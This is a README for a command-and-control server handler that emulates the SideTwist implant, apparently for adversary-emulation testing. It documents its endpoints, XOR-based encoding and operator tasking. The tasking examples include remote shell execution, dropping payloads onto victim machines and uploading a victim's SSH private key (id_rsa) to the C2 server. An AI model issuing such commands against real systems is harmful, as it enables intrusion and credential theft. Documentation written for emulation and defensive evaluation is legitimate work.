# SideTwist handler

The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending commands embedded in HTML and receiving the associated output.

## Components
The handler consists of a web server that listens on a specified address/port and serves the following URL endpoints:
- `GET /search/{guid}`, where `{guid}` represents the unique ID of an implant session to register and receive tasks. E.g. the first `GET` request for `/search/1234` will create a new implant session with ID `1234`, and subsequent `GET` requests will simply return tasks.
- `POST /search/{guid}` is used to submit results (task output or file uploads) for the implant with the specified ID.
- `GET /getFile/{filename}` is used to fetch payloads of the name `{filename}`. Available payloads are listed in the `files` directory within the main C2 server repo.
- `GET /logo.png` serves the lookalike website logo. This will typically be requested only when using a browser to view the lookalike site.

## Usage

### Configuration
To enable and configure the SideTwist handler within the control server, edit the `config/handler_config.yml` from the main C2 server repo. Adjust the SideTwist entry as needed.

Example:
```
sidetwist:
  host: 192.168.0.8
  port: 443
  enabled: true
```

Run the `controlServer` binary as `sudo` and look for success messages in starting up the SideTwist handler.

### Tasking Implants
To register or receive tasking for an implant session, the SideTwist handler expects a `GET` request for `/search/{guid}`. If this is the first time that the SideTwist handler recognizes the implant with id `{guid}`, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent `GET` requests to the same endpoint.

For example:
```
curl http://192.168.0.4:443/search/abcd # First request, registers a new implant session with ID "abcd". Returns empty task.
curl http://192.168.0.4:443/search/abcd # Second request. Session for "abcd" already exists, returns a task if available, otherwise empty task.
```

As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the `evalsC2client.py` script. 
The SideTwist handler will allow operators to task the following command types:
- `101 command arg1 arg2...` - the command ID `101` will have the implant execute a shell command with the provided args. Note that a command is required for ID `101`.
- `102 saveAsName|payloadName` - the command ID `102` will have the implant request a payload specified by `payloadName` and save it as `saveAsName`.
	- WARNING: the handler does not validate the command structure or payload names/paths, so operators must ensure that the correct names and paths are used, the `|` character is correctly placed, etc.
- `103 fileToUpload` - the command ID `103` will have the implant upload the specified local file to the C2 server.
- `104 command arg1 arg2...` - the command ID `104` is an alias for command ID `101`. Note that a command is required for ID `104`.
- `105` - instructs the implant to terminate. Used when the implant is in loop mode.

Examples of valid tasking:
```
./evalsC2client.py --set-task <guid> '101 whoami.exe'
./evalsC2client.py --set-task <guid> '101 ping 1.2.3.4'
./evalsC2client.py --set-task <guid> '102 c:\users\public\payload.exe|payload.exe'
./evalsC2client.py --set-task <guid> '102 localpath\file.name|serverfile.name'
./evalsC2client.py --set-task <guid> '103 c:\users\dummy\.ssh\id_rsa'
./evalsC2client.py --set-task <guid> '104 dir "C:\path with\spaces"'
./evalsC2client.py --set-task <guid> '105'
```

Examples of invalid tasking:
```
./evalsC2client.py --set-task <guid> '101' # 101 requires a command
./evalsC2client.py --set-task <guid> '102' # 102 requires a payload name
./evalsC2client.py --set-task <guid> '103' # 103 requires a filename
./evalsC2client.py --set-task <guid> '104' # 104 requires a command
./evalsC2client.py --set-task <guid> '106' # 106 is not a supported command ID
```

When the implant beacons in with the `GET /search/{guid}` requests, the returned HTTP response contains an HTML page with an embedded task string that has been encrypted and base64-encoded.
The embedded string is placed within `<script>` HTML tags, e.g.:
```
<script>/*Q14IEQ==*/</script>
```

Encryption and decryption are performed by XOR'ing the plaintext/ciphertext with the hardcoded key `notmersenne`.
The underlying plaintext data is the task string that gets processed by the implant and is of the form `commandNumber|commandID|base64(command to execute)`.
For instance, the first task assigned to the implant may look something like `1|101|d2hvYW1pLmV4ZSAvYWxs` (base64 encoding of `whoami.exe /all`), and the second task may look something like `2|102|YzpcdXNlcnNccHVibGljXHBheWxvYWQuZXhlfHBheWxvYWQuZXhl` (base64 encoding of `c:\users\public\payload.exe|payload.exe`). Note that if an implant beacons in, but there is no pending task for the session, the empty task string `-1||` is returned.

### Payloads
Like tasking, requested payloads are XOR-encrypted and base64-encoded before being returned. However, the payload data is not embedded in an HTML page. Instead, the raw encrypted/encoded file data is returned.

SideTwist-specific payloads must be stored within the `payloads/SideTwist` directory within the parent directory of the control server. For instance, if the control server is being run from the `Resources/control_server` directory, the payloads must be placed in `Resources/payloads/SideTwist/` in order for the SideTwist handler to successfully serve them.

### File Uploads and Task Output
When implants send task output or file uploads to the SideTwist C2 handler, they must do so by sending an HTTP `POST` request to `/search/{guid}` with their corresponding `guid` value. The server will not accept task output or file uploads from an implant if no task was assigned to the implant or if the specified task does not expect output (e.g. tasking the implant to terminate itself). The `POST` data must be a JSON dictionary with one key-value pair - the key is a string representation of the corresponding command number, and the value is a string containing the base64 encoding of the XOR-encrypted output or uploaded file data. 

Example (implant `abcd` submits output `thisismyoutput` for command number 5):
```
curl -X POST --data '{"5": "GgcdHgwBHhwBGxEeGgA="}' http://192.168.0.4:443/search/abcd
```

Upon success, a successful HTTP response code is sent back with an empty response body.

For regular task output, the SideTwist handler will forward the decoded and decrypted output to the REST server. File uploads will be decoded and decrypted before being written to the server's file system.

Note that the file uploads themselves do not contain the file name to save as - this is determined by the handler when tasking the implant with command ID `104`. For instance, if the implant is tasked with `104 C:\path\to\file.txt`, then the received file upload data will be saved as `file.txt` within the C2 server's `files` directory.

### Bootstrap Tasking
Since the SideTwist implant beacons back infrequently, the first beacon can be "wasted" since all it does is register a session without returning a command. If operators choose to do so, they can register "bootstrap" tasks, which will be the first task sent to any new session registered with the sidetwist handler. Note that only one bootstrap task can be registered for the SideTwist handler, and the task will only be sent on the implant's first beacon when registering a session. Subsequent beacons from the same implant will not return this task.

To set a bootstrap task, use the `evalsC2client.py` script accordingly:

```
./evalsC2client.py --set-bootstrap-task sidetwist '101 whoami.exe /all'
```
In the example above, all new sidetwist sessions will be tasked with `101 whoami.exe/all`. Note that the task syntax must be the same as in regular tasking via `--set-task`.
Subsequent calls to `--set-bootstrap-task` will overwrite the currently set task.

To view or clear the currently set bootstrap task, run the following:
```
./evalsC2client.py --get-bootstrap-task sidetwist # view the currently set bootstrap task for sidetwist
./evalsC2client.py --del-bootstrap-task sidetwist # clear the bootstrap task for sidetwist
```

### Error Messages
In order to maintain some level of secrecy and OpSec, the handler will not return specific error messages in response to HTTP requests. Any specific error messages will be logged to the console and log file on the C2 server itself. The implant and HTTP requests will simply receive a generic error message of `Internal server error` with HTTP error code `500`.
